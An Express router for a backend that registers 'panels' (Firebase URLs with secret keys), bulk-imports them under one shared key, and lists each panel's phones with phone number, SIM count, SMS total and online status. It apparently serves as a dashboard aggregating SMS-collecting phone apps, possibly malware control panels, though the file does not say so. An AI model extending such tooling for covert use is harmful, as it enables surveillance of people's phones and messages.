import { Router, type IRouter } from "express";
import { db, panelsTable } from "@workspace/db";
import { eq } from "drizzle-orm";
import { fetchPanelDevices } from "../lib/firebase";
import { notifyBulkPanelsAdded, notifyNewPanel } from "../lib/notifications";
import {
  CreatePanelBody,
  DeletePanelParams,
  GetPanelDevicesParams,
} from "@workspace/api-zod";

const router: IRouter = Router();

function normalizeFirebaseUrl(url: string): string {
  return url.trim().replace(/\/+$/, "").toLowerCase();
}

async function notifyPanelDevices(panel: typeof panelsTable.$inferSelect): Promise<void> {
  const devices = await fetchPanelDevices(panel.firebaseUrl, panel.secretKey, panel.id, panel.name);
  await notifyNewPanel(panel.name, devices);
}

router.get("/panels", async (_req, res): Promise<void> => {
  const panels = await db.select().from(panelsTable).orderBy(panelsTable.createdAt);
  res.json(
    panels.map((p) => ({
      id: p.id,
      name: p.name,
      firebaseUrl: p.firebaseUrl,
      createdAt: p.createdAt.toISOString(),
    }))
  );
});

router.post("/panels", async (req, res): Promise<void> => {
  const parsed = CreatePanelBody.safeParse(req.body);
  if (!parsed.success) {
    res.status(400).json({ error: parsed.error.message });
    return;
  }

  const firebaseUrl = parsed.data.firebaseUrl.trim();
  const existingPanels = await db.select().from(panelsTable);
  const duplicate = existingPanels.find(
    (panel) => normalizeFirebaseUrl(panel.firebaseUrl) === normalizeFirebaseUrl(firebaseUrl),
  );
  if (duplicate) {
    res.status(409).json({ error: "Firebase already exists", panelId: duplicate.id, panelName: duplicate.name });
    return;
  }

  const [panel] = await db
    .insert(panelsTable)
    .values({
      name: parsed.data.name,
      firebaseUrl,
      secretKey: parsed.data.secretKey,
    })
    .returning();

  void notifyPanelDevices(panel).catch(() => undefined);

  res.status(201).json({
    id: panel.id,
    name: panel.name,
    firebaseUrl: panel.firebaseUrl,
    createdAt: panel.createdAt.toISOString(),
    totalDevices: 0,
    onlineDevices: 0,
    offlineDevices: 0,
  });
});

router.post("/panels/bulk", async (req, res): Promise<void> => {
  const rawUrls = Array.isArray(req.body?.firebaseUrls)
    ? req.body.firebaseUrls
    : typeof req.body?.firebaseUrls === "string"
      ? req.body.firebaseUrls.split(/[\n, ]+/)
      : [];
  const firebaseUrls = Array.from(
    new Map(
      rawUrls
        .map((url) => String(url).trim())
        .filter(Boolean)
        .map((url) => [normalizeFirebaseUrl(url), url]),
    ).values(),
  );
  const secretKey = typeof req.body?.secretKey === "string" ? req.body.secretKey.trim() : "";
  const namePrefix = typeof req.body?.namePrefix === "string" && req.body.namePrefix.trim()
    ? req.body.namePrefix.trim()
    : "Firebase Panel";

  if (!firebaseUrls.length || !secretKey) {
    res.status(400).json({ error: "Firebase URLs and auth key are required" });
    return;
  }
  if (firebaseUrls.some((url) => !/^https?:\/\/.+/i.test(url))) {
    res.status(400).json({ error: "One or more Firebase URLs are invalid" });
    return;
  }

  const existing = await db.select().from(panelsTable);
  const existingUrls = new Set(existing.map((panel) => normalizeFirebaseUrl(panel.firebaseUrl)));
  const newUrls = firebaseUrls.filter((url) => !existingUrls.has(normalizeFirebaseUrl(url)));

  if (!newUrls.length) {
    res.status(409).json({
      error: "All Firebase URLs already exist",
      added: 0,
      skipped: firebaseUrls.length,
      panels: [],
    });
    return;
  }

  const startIndex = existing.length + 1;
  const inserted = await db
    .insert(panelsTable)
    .values(newUrls.map((firebaseUrl, index) => ({
      name: `${namePrefix} ${startIndex + index}`,
      firebaseUrl,
      secretKey,
    })))
    .returning();

  void notifyBulkPanelsAdded(inserted.map((panel) => ({ panelName: panel.name, devices: [] }))).catch(() => undefined);

  res.status(201).json({
    added: inserted.length,
    skipped: firebaseUrls.length - inserted.length,
    panels: inserted.map((panel) => ({
      id: panel.id,
      name: panel.name,
      firebaseUrl: panel.firebaseUrl,
      createdAt: panel.createdAt.toISOString(),
      totalDevices: 0,
      onlineDevices: 0,
      offlineDevices: 0,
    })),
  });
});

router.delete("/panels", async (_req, res): Promise<void> => {
  const deleted = await db.delete(panelsTable).returning({ id: panelsTable.id });
  res.json({ deleted: deleted.length });
});

router.delete("/panels/:id", async (req, res): Promise<void> => {
  const raw = Array.isArray(req.params.id) ? req.params.id[0] : req.params.id;
  const params = DeletePanelParams.safeParse({ id: parseFloat(raw) });
  if (!params.success) {
    res.status(400).json({ error: "Invalid ID" });
    return;
  }
  const [deleted] = await db
    .delete(panelsTable)
    .where(eq(panelsTable.id, params.data.id))
    .returning();
  if (!deleted) {
    res.status(404).json({ error: "Panel not found" });
    return;
  }
  res.sendStatus(204);
});

router.get("/panels/:id/devices", async (req, res): Promise<void> => {
  const raw = Array.isArray(req.params.id) ? req.params.id[0] : req.params.id;
  const params = GetPanelDevicesParams.safeParse({ id: parseFloat(raw) });
  if (!params.success) {
    res.status(400).json({ error: "Invalid ID" });
    return;
  }
  const [panel] = await db.select().from(panelsTable).where(eq(panelsTable.id, params.data.id));
  if (!panel) {
    res.status(404).json({ error: "Panel not found" });
    return;
  }
  const devices = await fetchPanelDevices(panel.firebaseUrl, panel.secretKey, panel.id, panel.name);
  res.json(devices.map((d) => ({
    id: d.id,
    name: d.name,
    status: d.status,
    phoneNumber: d.phoneNumber,
    battery: d.battery,
    model: d.model,
    lastSeen: d.lastSeen,
    simCount: d.simCount,
    totalSms: d.totalSms,
    panelId: d.panelId,
    panelName: d.panelName,
  })));
});

export default router;
